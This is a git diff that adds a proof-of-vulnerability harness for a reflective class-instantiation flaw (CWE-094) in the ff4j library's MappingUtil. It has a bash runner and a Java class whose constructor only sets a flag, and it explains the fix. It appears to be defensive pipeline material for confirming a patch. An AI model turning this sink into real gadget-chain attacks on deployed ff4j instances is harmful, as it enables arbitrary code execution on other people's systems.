@@ -1,0 +1,123 @@
+diff --git a/.security-pipeline/pov/out/org/ff4j/pov/MappingUtilInjectionPoV$NotAFlippingStrategy.class b/.security-pipeline/pov/out/org/ff4j/pov/MappingUtilInjectionPoV$NotAFlippingStrategy.class
+new file mode 100644
+index 0000000..837f6d0
+Binary files /dev/null and b/.security-pipeline/pov/out/org/ff4j/pov/MappingUtilInjectionPoV$NotAFlippingStrategy.class differ
+diff --git a/.security-pipeline/pov/out/org/ff4j/pov/MappingUtilInjectionPoV.class b/.security-pipeline/pov/out/org/ff4j/pov/MappingUtilInjectionPoV.class
+new file mode 100644
+index 0000000..31b5f3c
+Binary files /dev/null and b/.security-pipeline/pov/out/org/ff4j/pov/MappingUtilInjectionPoV.class differ
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100755
+index 0000000..4e3fa8d
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,29 @@
++#!/usr/bin/env bash
++# PoV runner for CWE-094 reflective construction in org.ff4j.utils.MappingUtil#instanceFlippingStrategy.
++#
++# Builds the ff4j-core module (needed so org.ff4j.utils.MappingUtil / org.ff4j.core.FlippingStrategy
++# .class files exist), compiles the standalone PoV against those real production classes, and runs it.
++#
++# Exit code contract:
++#   0  -> vulnerable behavior reproduced (attacker-controlled class was reflectively constructed)
++#   !=0 -> vulnerable behavior NOT observed (e.g. a correct fix now blocks construction)
++set -euo pipefail
++
++REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
++cd "$REPO_ROOT"
++
++POV_DIR=".security-pipeline/pov"
++POV_SRC="$POV_DIR/src/org/ff4j/pov/MappingUtilInjectionPoV.java"
++POV_OUT="$POV_DIR/out"
++
++rm -rf "$POV_OUT"
++mkdir -p "$POV_OUT"
++
++# Build just ff4j-core so we exercise the real, compiled production sink.
++mvn -q -B -pl ff4j-core -am package -DskipTests -Dmaven.test.skip=true
++
++CORE_CLASSES="ff4j-core/target/classes"
++
++javac -cp "$CORE_CLASSES" -d "$POV_OUT" "$POV_SRC"
++
++java -cp "$CORE_CLASSES:$POV_OUT" org.ff4j.pov.MappingUtilInjectionPoV
+diff --git a/.security-pipeline/pov/src/org/ff4j/pov/MappingUtilInjectionPoV.java b/.security-pipeline/pov/src/org/ff4j/pov/MappingUtilInjectionPoV.java
+new file mode 100644
+index 0000000..3dd3185
+--- /dev/null
++++ b/.security-pipeline/pov/src/org/ff4j/pov/MappingUtilInjectionPoV.java
+@@ -0,0 +1,74 @@
++package org.ff4j.pov;
++
++import java.util.HashMap;
++import java.util.Map;
++import java.util.concurrent.atomic.AtomicBoolean;
++
++import org.ff4j.core.FlippingStrategy;
++import org.ff4j.utils.MappingUtil;
++
++/**
++ * Proof-of-vulnerability for CWE-094 (Improper Control of Generation of Code / reflective
++ * code injection) in ff4j.
++ *
++ * Root cause: org.ff4j.utils.MappingUtil#instanceFlippingStrategy(String, String, Map) resolves
++ * an attacker-controlled class name with Class.forName(...) and invokes newInstance() BEFORE any
++ * check that the resolved class is actually assignable to the expected base type
++ * (org.ff4j.core.FlippingStrategy). The cast to FlippingStrategy only happens AFTER construction,
++ * so the no-arg constructor of ANY class reachable on the classpath runs unconditionally whenever
++ * a caller (properties parser, XML parser, JSON parser, or the embedded web console) forwards an
++ * untrusted "flipping strategy class" / "property type class" string into this sink.
++ *
++ * This PoV drives the real production entry point (MappingUtil.instanceFlippingStrategy) with an
++ * attacker-supplied class name that does NOT implement FlippingStrategy at all. On vulnerable
++ * code, the constructor of the attacker class still executes (observable side effect) before the
++ * post-construction cast fails and is swallowed into a FeatureAccessException. A correct fix must
++ * validate FlippingStrategy.class.isAssignableFrom(clazz) (or use an allow-list) BEFORE calling
++ * newInstance(), so the attacker class is never constructed and no side effect occurs.
++ */
++public class MappingUtilInjectionPoV {
++
++    /** Flips to true only if the attacker-controlled class is actually instantiated. */
++    static final AtomicBoolean PAYLOAD_EXECUTED = new AtomicBoolean(false);
++
++    /**
++     * Stand-in for an attacker-supplied "flipping strategy" class name. It intentionally does NOT
++     * implement org.ff4j.core.FlippingStrategy, to prove the sink performs no base-type check
++     * prior to reflective construction. Its constructor represents arbitrary attacker code that
++     * runs as a side effect of reflective instantiation (in a real gadget chain this could be a
++     * JNDI-triggering class, a file-writing class, etc.).
++     */
++    public static class NotAFlippingStrategy {
++        public NotAFlippingStrategy() {
++            PAYLOAD_EXECUTED.set(true);
++        }
++    }
++
++    public static void main(String[] args) {
++        String attackerControlledClassName = NotAFlippingStrategy.class.getName();
++        Map<String, String> initParams = new HashMap<String, String>();
++
++        boolean vulnerable = false;
++        try {
++            FlippingStrategy fs = MappingUtil.instanceFlippingStrategy("pov-uid", attackerControlledClassName, initParams);
++            // If a real FlippingStrategy is somehow returned, that is even more clearly wrong.
++            vulnerable = (fs != null) || PAYLOAD_EXECUTED.get();
++        } catch (Throwable t) {
++            // Expected on today's code: MappingUtil wraps the post-construction ClassCastException
++            // into a FeatureAccessException. By the time this exception is thrown, the attacker
++            // class's constructor has ALREADY run -- that is the vulnerability.
++            vulnerable = PAYLOAD_EXECUTED.get();
++        }
++
++        if (vulnerable) {
++            System.out.println("VULNERABLE: MappingUtil.instanceFlippingStrategy reflectively constructed "
++                    + "attacker-controlled class '" + attackerControlledClassName + "' even though it does not "
++                    + "implement FlippingStrategy. No base-type check ran before Class.forName(...).newInstance().");
++            System.exit(0);
++        } else {
++            System.out.println("NOT VULNERABLE: attacker-controlled class name was rejected before "
++                    + "construction; no side effect was observed.");
++            System.exit(1);
++        }
++    }
++}
